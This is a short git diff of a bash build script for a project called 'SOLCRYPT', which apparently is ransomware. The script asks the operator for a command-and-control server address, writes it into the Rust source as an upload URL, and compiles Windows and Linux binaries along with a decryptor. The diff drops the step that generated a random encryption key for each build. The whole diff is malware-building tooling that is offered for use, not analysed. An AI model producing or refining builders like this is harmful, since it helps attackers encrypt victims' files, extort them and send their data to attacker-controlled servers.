@@ -2,12 +2,9 @@
 echo "SOLCRYPT v. 001"
 echo "Build Script v. 001"
 echo "[!] Preparing..."
-cp src/crypto.rs src/crypto.rs.bak
-echo "[i] Replacing key with random data."
-export KEY="$(tr -dc A-Za-z0-9 </dev/urandom | head -c 32)"
-sed -i -e "s/keyhereshouldbereplacedbybuilder/$KEY/g" src/crypto.rs
+cp src/main.rs src/main.rs.bak
 read -p "C2 Server Address: " C2ADDR
-sed -i -e "s/c2serveraddr/$C2ADDR/g" src/crypto.rs
+sed -i -e "s/uploadurlhere/$C2ADDR/g" src/main.rs
 echo "[!] Source ready."
 PS3='Please select option:'
 options=("Windows" "Linux" "Both" "Quit")
@@ -29,7 +26,7 @@ do
             cargo build --bin decryptor --target x86_64-unknown-linux-gnu --release
             ;;
         "Quit")
-            mv src/crypto.rs.bak src/crypto.rs
+            mv src/main.rs.bak src/main.rs
             break
             ;;
         *) echo "invalid option $REPLY";;
